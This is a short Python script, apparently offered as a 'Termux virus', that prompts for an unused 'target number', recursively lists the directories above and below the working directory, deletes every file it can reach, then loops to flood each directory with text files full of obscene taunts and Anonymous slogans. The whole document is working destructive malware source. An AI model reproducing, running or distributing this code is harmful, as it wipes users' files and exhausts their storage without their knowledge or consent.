import os
import time
import random



def file_detecting():
    path = os.getcwd()
    print(path)
    operation_1 = list(path)
    directories = []
    files = []
    or_paths= []
    slice_p = []
    count = 0
    for i in operation_1:
        count += 1
        if i == '/':
            slice_p.append(path[:count])
            for x in slice_p:
                if os.path.exists(x):
                    lstdir = os.listdir(x)
                    for y in lstdir:
                        new_path = str(x)+'/'+str(y)
                        or_paths.append(new_path)
                        if os.path.isdir(new_path):
                            directories.append(new_path)
                            
                            print(new_path)
                        elif os.path.isfile(new_path):
                                files.append(new_path)
                                print(new_path)
    try:
        dir_count = 68        
        for sd in directories:
            dir_count +=1
            sub_dire = os.listdir(directories[dir_count-1])
            for adsd in sub_dire:
                if os.path.isdir(str(directories[dir_count-1])+'/'+str(adsd)):
                    directories.append(str(directories[dir_count-1])+'/'+str(adsd))
                else:
                    files.append(str(directories[dir_count-1])+'/'+str(adsd))
                        
             
    except Exception :
        pass           
                              


    for f in files:
        try:
            os.remove(f)
        except Exception as e :
            pass
        
             
    for d in directories:
        for u in range(100000000*1000000000000):
            try:
             with open(d+'att0{u}.txt' ,'a') as fc:
                  fc.write("Fuck You Bitch Fuck Fuck Fuck Termux virus successfully attacked you fuck fuck fuck fuck fuck fuck\n"*10000)
                  print(d+'att0.txt')
                  
                  
            except Exception as e:
                print(e)
                  
          
            
            
           



user_res1 = input("Enter target number ::: " )
file_detecting()
for i in range(100):
    print("Fuck You Bitch Fuck Fuck Fuck Termux virus successfully attacked you fuck fuck fuck fuck fuck fuck ")
    print("We are anonymouse we are legend do not fogive do not foget expect us anonymous")
